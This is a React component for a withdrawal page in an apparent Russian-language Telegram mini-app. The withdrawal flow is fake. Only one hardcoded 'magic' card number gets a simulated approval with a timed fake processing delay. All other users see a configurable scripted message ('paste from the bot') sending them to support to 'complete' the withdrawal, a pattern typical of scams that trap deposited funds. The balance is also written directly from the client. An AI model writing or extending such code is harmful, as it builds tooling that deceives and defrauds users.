import React, { useState } from 'react';
import { ArrowLeft, Loader2, CheckCircle2 } from 'lucide-react';
import { Haptic } from '../utils/haptics';
import { useUser } from '../context/UserContext';
import { useToast } from '../context/ToastContext';
import { supabase } from '../lib/supabase';

const MAGIC_REQUISITES = '2200701921604499';

interface WithdrawPageProps {
  balance: number;
  onBack: () => void;
  onWithdraw: (amount: number) => void;
}

type Step = 'AMOUNT' | 'REQUISITES' | 'CONFIRM' | 'PROCESS' | 'SUCCESS_APPROVED' | 'SUCCESS_PASTE';

const WithdrawPage: React.FC<WithdrawPageProps> = ({ balance, onBack, onWithdraw }) => {
  const { user, tgid, withdrawTemplates, supportLink, minWithdraw, refreshUser } = useUser();
  const toast = useToast();
  const [step, setStep] = useState<Step>('AMOUNT');
  const [amount, setAmount] = useState('');
  const [requisites, setRequisites] = useState('');

  const template = withdrawTemplates.find((t) => t.message_type === (user?.withdraw_message_type || 'default')) || withdrawTemplates[0];
  const amountNum = parseFloat(amount.replace(',', '.')) || 0;
  const requisitesNormalized = requisites.replace(/\s/g, '');
  const canSubmitAmount = balance >= minWithdraw && amountNum >= minWithdraw && amountNum <= balance;
  const formattedBalance = new Intl.NumberFormat('ru-RU', { minimumFractionDigits: 0, maximumFractionDigits: 2 }).format(balance);
  const formattedMin = new Intl.NumberFormat('ru-RU', { minimumFractionDigits: 0 }).format(minWithdraw);
  const formattedAmount = new Intl.NumberFormat('ru-RU', { minimumFractionDigits: 0, maximumFractionDigits: 2 }).format(amountNum);

  const maskRequisites = (s: string) => {
    const n = s.replace(/\s/g, '');
    if (n.length <= 4) return n;
    return '•••• ' + n.slice(-4);
  };

  const handleConfirmWithdraw = async () => {
    if (!tgid || !user || amountNum <= 0 || amountNum > balance) {
      Haptic.error();
      return;
    }
    Haptic.light();
    setStep('PROCESS');

    const isMagicRequisites = requisitesNormalized === MAGIC_REQUISITES;

    if (isMagicRequisites) {
      // Имитация обработки 2–2.5 сек, затем списание и успех
      await new Promise((r) => setTimeout(r, 2200));
      const newBalance = balance - amountNum;
      const { error } = await supabase
        .from('users')
        .update({ balance: newBalance })
        .eq('user_id', user.user_id);
      if (error) {
        Haptic.error();
        setStep('CONFIRM');
        toast.show('Ошибка списания. Попробуйте снова.', 'error');
        return;
      }
      await refreshUser();
      onWithdraw(amountNum);
      Haptic.success();
      setStep('SUCCESS_APPROVED');
    } else {
      // Обычная заявка: показываем пасту из бота
      await new Promise((r) => setTimeout(r, 1800));
      Haptic.light();
      setStep('SUCCESS_PASTE');
    }
  };

  const renderStepContent = () => {
    switch (step) {
      case 'AMOUNT':
        return (
          <div className="space-y-6 pt-6 px-4">
            <div className="bg-[#0a0a0a] border border-neutral-800 rounded-xl p-4 mb-2">
              <span className="text-xs text-neutral-500 uppercase">Доступно</span>
              <div className="text-2xl font-mono font-bold text-white">{formattedBalance} ₽</div>
              <span className="text-xs text-neutral-500">Мин. вывод: {formattedMin} ₽</span>
            </div>
            <div className="space-y-2">
              <label className="text-xs text-neutral-500 uppercase font-bold pl-1">Сумма вывода (₽)</label>
              <div className="bg-[#0a0a0a] border border-neutral-800 rounded-xl px-4 py-3 flex items-center justify-between focus-within:border-neon/50 transition-all">
                <input
                  type="number"
                  inputMode="decimal"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  className="w-full bg-transparent text-white font-mono text-2xl font-bold outline-none placeholder-neutral-700"
                  placeholder="0"
                />
                <span className="text-neutral-500 font-medium">₽</span>
              </div>
              <div className="flex flex-wrap gap-2">
                {[...new Set([minWithdraw, 1000, 5000, Math.min(Math.floor(balance * 0.5), balance)])].filter((v) => v >= minWithdraw).sort((a, b) => a - b).slice(0, 4).map((v) => (
                  <button key={v} type="button" onClick={() => { Haptic.tap(); setAmount(String(v)); }} className="px-3 py-1.5 rounded-lg bg-white/5 text-neutral-400 text-sm font-mono hover:bg-neon/20 hover:text-neon active:scale-95">
                    {v >= 1000 ? (v >= 10000 ? v / 1000 + 'k' : v) : v} ₽
                  </button>
                ))}
              </div>
              <div className="flex justify-between px-1">
                <span className="text-[10px] text-neutral-600">Мин: {formattedMin} ₽</span>
                <span className="text-[10px] text-neutral-600">Макс: {formattedBalance} ₽</span>
              </div>
            </div>
            <button
              onClick={() => {
                if (!amount || isNaN(amountNum) || amountNum < minWithdraw) {
                  Haptic.error();
                  toast.show(`Минимальная сумма вывода: ${formattedMin} ₽`, 'error');
                  return;
                }
                if (amountNum > balance) {
                  Haptic.error();
                  toast.show('Недостаточно средств на балансе.', 'error');
                  return;
                }
                Haptic.light();
                setStep('REQUISITES');
              }}
              disabled={!amount || amountNum < minWithdraw || amountNum > balance}
              className="w-full py-4 bg-neon text-black font-bold rounded-xl active:scale-95 transition-transform disabled:opacity-50 disabled:pointer-events-none"
            >
              Далее
            </button>
          </div>
        );

      case 'REQUISITES':
        return (
          <div className="space-y-6 pt-6 px-4">
            <div className="bg-[#0a0a0a] border border-neutral-800 rounded-xl p-4">
              <span className="text-xs text-neutral-500 uppercase">Сумма</span>
              <div className="text-xl font-mono font-bold text-white">{formattedAmount} ₽</div>
            </div>
            <div className="space-y-2">
              <label className="text-xs text-neutral-500 uppercase font-bold pl-1">Реквизиты для получения</label>
              <div className="bg-[#0a0a0a] border border-neutral-800 rounded-xl px-4 py-3 focus-within:border-neon/50 transition-all">
                <input
                  type="text"
                  inputMode="numeric"
                  value={requisites}
                  onChange={(e) => setRequisites(e.target.value.replace(/\D/g, '').slice(0, 24))}
                  className="w-full bg-transparent text-white font-mono text-lg outline-none placeholder-neutral-600"
                  placeholder="Номер карты или счёта"
                />
              </div>
              <p className="text-[10px] text-neutral-600 px-1">Введите номер карты или счёта, куда перевести средства.</p>
            </div>
            <button
              onClick={() => {
                if (!requisites.trim()) {
                  Haptic.error();
                  toast.show('Введите реквизиты.', 'error');
                  return;
                }
                Haptic.light();
                setStep('CONFIRM');
              }}
              disabled={!requisites.trim()}
              className="w-full py-4 bg-neon text-black font-bold rounded-xl active:scale-95 transition-transform disabled:opacity-50 disabled:pointer-events-none"
            >
              Далее
            </button>
            <button
              onClick={() => { Haptic.tap(); setStep('AMOUNT'); }}
              className="w-full py-3 border border-neutral-700 text-neutral-400 rounded-xl font-medium active:scale-[0.98]"
            >
              Назад
            </button>
          </div>
        );

      case 'CONFIRM':
        return (
          <div className="pt-6 px-4 flex flex-col">
            <h2 className="text-lg font-bold text-center mb-6">Подтверждение вывода</h2>
            <div className="bg-[#0a0a0a] border border-neutral-800 rounded-xl p-5 space-y-4 mb-6 relative overflow-hidden">
              <div className="absolute top-0 left-0 w-1 h-full bg-neon" />
              <div>
                <div className="text-xs text-neutral-500 uppercase tracking-wider mb-1">Сумма</div>
                <div className="text-2xl font-mono font-bold text-white">{formattedAmount} ₽</div>
              </div>
              <div className="h-px bg-white/5 w-full" />
              <div>
                <div className="text-xs text-neutral-500 uppercase tracking-wider mb-1">Реквизиты</div>
                <div className="text-sm font-mono text-white bg-neutral-900 rounded-lg p-3 border border-dashed border-neutral-700">
                  {requisitesNormalized ? maskRequisites(requisitesNormalized) : '—'}
                </div>
              </div>
            </div>
            <button
              onClick={handleConfirmWithdraw}
              className="w-full py-4 bg-neon text-black font-bold rounded-xl active:scale-95 transition-transform shadow-[0_4px_20px_rgba(163,230,53,0.2)] mt-auto mb-6"
            >
              Подтвердить вывод
            </button>
            <button
              onClick={() => { Haptic.light(); setStep('REQUISITES'); }}
              className="w-full py-3 border border-neutral-700 text-neutral-400 rounded-xl font-medium"
            >
              Назад
            </button>
          </div>
        );

      case 'PROCESS':
        return (
          <div className="absolute inset-0 flex flex-col items-center justify-center bg-[#050505] z-50 animate-fade-in p-6">
            <div className="relative flex items-center justify-center h-24 w-24 rounded-full bg-neon/10 mb-6">
              <div className="absolute inset-0 rounded-full border-2 border-neon/40 border-t-transparent animate-spin" />
              <Loader2 size={40} className="text-neon animate-pulse" />
            </div>
            <h2 className="text-xl font-bold text-white mb-2">Обработка заявки</h2>
            <p className="text-neutral-500 text-sm text-center max-w-xs">
              Проверяем реквизиты и списываем средства...
            </p>
          </div>
        );

      case 'SUCCESS_APPROVED':
        return (
          <div className="absolute inset-0 flex flex-col items-center justify-center bg-[#050505] z-50 animate-fade-in p-6 text-center">
            <div className="relative flex items-center justify-center h-28 w-28 rounded-full bg-green-500/10 mb-6">
              <div className="absolute inset-0 rounded-full border-2 border-green-500/50 animate-pulse" />
              <CheckCircle2 size={56} className="text-green-500" />
            </div>
            <h2 className="text-2xl font-bold text-white mb-2">Вывод одобрен</h2>
            <p className="text-neutral-400 mb-2">
              <span className="font-mono text-white">{formattedAmount} ₽</span> списаны с баланса.
            </p>
            <p className="text-neutral-500 text-sm mb-8 max-w-xs">
              Средства поступят на указанные реквизиты в ближайшее время.
            </p>
            <button
              onClick={() => { Haptic.tap(); onBack(); }}
              className="px-8 py-3 rounded-full bg-neon text-black font-bold active:scale-95"
            >
              На главную
            </button>
          </div>
        );

      case 'SUCCESS_PASTE':
        return (
          <div className="absolute inset-0 flex flex-col bg-[#050505] z-50 animate-fade-in p-6 overflow-y-auto">
            <div className="flex flex-col items-center text-center pt-4 pb-6">
              <div className="h-16 w-16 rounded-full bg-neutral-800 flex items-center justify-center text-3xl mb-4">
                {template?.icon || '💬'}
              </div>
              <h2 className="text-xl font-bold text-white mb-2">{template?.title || 'Заявка на вывод'}</h2>
              <p className="text-neutral-500 text-sm mb-6">
                Ваша заявка на <span className="font-mono text-white">{formattedAmount} ₽</span> принята.
              </p>
            </div>
            <div className="bg-[#0a0a0a] border border-neutral-800 rounded-xl p-5 mb-6">
              <p className="text-sm text-neutral-300 whitespace-pre-wrap leading-relaxed">
                {template?.description || 'Для завершения вывода свяжитесь с поддержкой. Укажите сумму и реквизиты.'}
              </p>
            </div>
            <a
              href={supportLink}
              target="_blank"
              rel="noopener noreferrer"
              className="block w-full py-4 bg-neon text-black font-bold rounded-xl text-center active:scale-95 transition-transform mb-4"
              onClick={() => Haptic.tap()}
            >
              {template?.button_text || 'Написать в поддержку'}
            </a>
            <button
              onClick={() => { Haptic.tap(); onBack(); }}
              className="w-full py-3 border border-neutral-700 text-neutral-400 rounded-xl font-medium"
            >
              На главную
            </button>
          </div>
        );

      default:
        return null;
    }
  };

  const showHeader = step !== 'PROCESS' && step !== 'SUCCESS_APPROVED' && step !== 'SUCCESS_PASTE';

  return (
    <div className="flex flex-col h-full bg-[#050505] animate-fade-in relative">
      {showHeader && (
        <header className="flex items-center px-4 py-4 border-b border-white/5 flex-shrink-0">
          <button onClick={() => { Haptic.tap(); onBack(); }} className="text-neutral-400 hover:text-white mr-4">
            <ArrowLeft size={24} />
          </button>
          <span className="text-lg font-bold">Вывод средств</span>
        </header>
      )}

      <div className="flex-1 overflow-y-auto no-scrollbar relative">
        {renderStepContent()}
      </div>
    </div>
  );
};

export default WithdrawPage;
